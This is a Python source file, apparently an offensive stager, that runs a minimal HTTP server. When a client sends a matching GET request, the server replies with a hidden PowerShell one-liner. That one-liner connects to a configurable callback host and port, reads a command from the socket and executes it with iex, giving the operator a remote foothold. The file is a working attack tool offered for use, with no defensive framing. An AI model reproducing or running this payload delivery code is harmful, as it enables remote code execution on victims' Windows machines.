import socket
import time
import threading

class HTTPServer:
        def __init__(self, callback_address: str, listen_port: int, callback_port: int) -> None:
                self.callback_address   = callback_address
                self.listen_port        = listen_port
                self.callback_port      = callback_port
                self.listener           = None
                self.server_thread      = None
                self.server_shutdown    = threading.Event()

                self.client             = None
    
        def initialize_server(self) -> None:
                
                if self.listener:
                        return False

                self.listener           = socket.socket()
                self.listener.bind(("0.0.0.0", self.listen_port))
                self.listener.listen(socket.SOMAXCONN)

                self.server_thread      = threading.Thread(
                        target          = self.serve,
                        daemon          = True
                )
                self.server_thread.start()

                return True

        def serve(self) -> None:
                while True:
                        try:
                                self.client, address = self.listener.accept()
                        except:
                                return None
                        
                        self.client.setblocking(False)

                        if not self.verify_request():
                                continue

                        response        = self.get_response()
                        self.client.send(response.encode())
                        self.client.close()

        def shutdown(self) -> None:
                self.listener.close()
                self.listener           = None
                self.server_shutdown.set()
                self.server_thread      = None

                return True

        def verify_request(self) -> bool:
                data                    = self.wait_client().decode()

                if not data:
                        return False

                correct_request         = f"GET / HTTP/1.1"
                data                    = data.split("\r")[0]

                return data == correct_request

        def get_response(self) -> str:
                content                 = """powershell -wi h -c "start powershell -wi h -arg {`$t=[net.sockets.tcpclient]::new('""" + self.callback_address + "'," + str(self.callback_port) + ");[io.streamreader]::new(`$t.getstream()).readline()|iex}\""""
                http_response           = "HTTP/1.0 200 OK"
                http_server             = "Server: SilentHttp/1.0.0 (Kali)"
                date_now                = time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())
                http_date               = "Date: " + date_now
                http_content_type       = "Content-Type: application/octet-stream"

                actual_content_length   = str(len(content))

                content_length          = "Content-Length: " + actual_content_length
                last_modified           = "Last-Modified: " + date_now
                last_line               = "\r\n"

                http_header             = [
                        http_response,
                        http_server,
                        http_date,
                        http_content_type,
                        content_length,
                        last_modified,
                        last_line
                ]

                http_header             = "\r\n".join(http_header)
                full_response           = http_header + content

                return full_response

        def wait_client(self) -> bool:
                data                    = b""

                for wait_iteration in range(50):
                        try:
                                data    = self.client.recv(1024)
                                return data
                        except BlockingIOError:
                                time.sleep(0.1)
                        except ConnectionResetError:
                                return b""

                return data